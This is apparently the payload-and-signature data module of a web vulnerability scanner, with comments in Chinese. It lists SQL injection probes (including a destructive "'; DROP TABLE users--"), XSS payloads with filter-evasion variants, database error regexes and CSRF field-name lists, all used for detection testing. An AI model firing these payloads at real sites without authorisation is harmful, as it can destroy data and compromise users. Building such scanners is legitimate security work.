"""扫描载荷与特征库。

这里只放**纯数据**：payload 列表、正则特征、字段名清单、阈值常量。
不含任何第三方依赖，因此 ``tests/test_detection.py`` 可以在只装标准库的
环境里直接 import 本模块，逐条验证特征匹配行为。

拆出来的动机：原始版本把这些常量写在各扫描器的类体里，而扫描器类
``import requests`` / ``import bs4``，导致"想测 payload 和正则"必须先装
两个第三方包。数据与 IO 分离之后，检测逻辑可以在离线环境秒级验证。
"""

# --------------------------------------------------------------------------
# SQL 注入
# --------------------------------------------------------------------------

#: 16 条探测载荷。前 11 条是经典的"闭合引号 + 永真条件"家族，
#: 用来把注入点从字符串上下文里逃逸出来；中间几条是联合查询 / 排序探测；
#: 最后 4 条是布尔盲注对照组（``AND '1'='1'`` 恒真 vs ``AND '1'='2'`` 恒假）。
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' OR 'x'='x",
    "'; DROP TABLE users--",
    "1 OR 1=1",
    "-1 OR 1=1",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

#: 报错型注入的响应特征。键是数据库类型，值是正则列表。
#: 匹配方式为 ``re.search(pattern, body, re.IGNORECASE)``，
#: 命中顺序按 dict 插入顺序：MySQL → PostgreSQL → MSSQL → Oracle → SQLite。
SQL_ERRORS = {
    'MySQL': [
        r'SQL syntax.*MySQL',
        r'Warning.*mysql_.*',
        r'MySQL Query fail.*',
        r'SQL syntax.*MariaDB server',
    ],
    'PostgreSQL': [
        r'PostgreSQL.*ERROR',
        r'Warning.*\Wpg_.*',
        r'valid PostgreSQL result',
        r'Npgsql\.',
    ],
    'MSSQL': [
        r'Driver.*SQL[\-\_\ ]*Server',
        r'OLE DB.*SQL Server',
        r'\bSQL Server[^&lt;&quot;]+Driver',
        r'SQLServer JDBC Driver',
    ],
    'Oracle': [
        r'\bORA-[0-9][0-9][0-9][0-9]',
        r'Oracle error',
        r'Oracle.*Driver',
        r'Warning.*\Woci_.*',
    ],
    'SQLite': [
        r'SQLite/JDBCDriver',
        r'SQLite.Exception',
        r'System.Data.SQLite.SQLiteException',
        r'unrecognized token',
        r'syntax error',
        r'SQL:\s*SELECT',
        r'数据库错误',
    ],
}

#: 盲注判定的响应长度差阈值（字节）。超过就当作"响应结构变了"，记为疑似盲注。
#: 100 是拍出来的经验值，没有统计依据 —— README 的「已知局限」里已写明。
BLIND_DIFF_THRESHOLD = 100

# --------------------------------------------------------------------------
# XSS
# --------------------------------------------------------------------------

#: 16 条 XSS 载荷：`<script>` 直出、事件处理器、伪协议、大小写混淆四种绕过思路。
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=`javascript:alert('XSS')`>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
]

#: 反射判定用的"危险片段"。原 payload 原样出现固然算命中；
#: 这些片段同时出现在 payload 和响应里，也算（弱化版反射特征）。
XSS_DANGEROUS_TOKENS = [
    '<script',
    'javascript:',
    'onerror=',
    'onload=',
    'onfocus=',
]

#: 表单探测只跑前 N 条载荷，避免表单多的时候请求量爆炸。
FORM_PAYLOAD_LIMIT = 5

# --------------------------------------------------------------------------
# CSRF
# --------------------------------------------------------------------------

#: 被当作"CSRF 令牌"的字段名。第一轮用**子串**匹配隐藏域，
#: 第二轮用**全等**匹配任意 input —— 两轮语义不同，是原实现的既有行为。
CSRF_TOKEN_NAMES = [
    'csrf_token', 'csrftoken', 'csrf', '_csrf', 'csrf-token',
    'authenticity_token', '_token', 'token', 'anti-csrf-token',
    '__RequestVerificationToken', 'CSRFToken', 'csrf_name',
]

#: 命中即视为"状态改变型"表单，严重度从 medium 抬到 high。
SENSITIVE_FORM_KEYWORDS = [
    'password', 'pwd', 'login', 'register', 'signup',
    'delete', 'remove', 'transfer', 'payment', 'pay',
    'update', 'change', 'modify', 'edit', 'admin',
    'settings', 'profile', 'account',
]
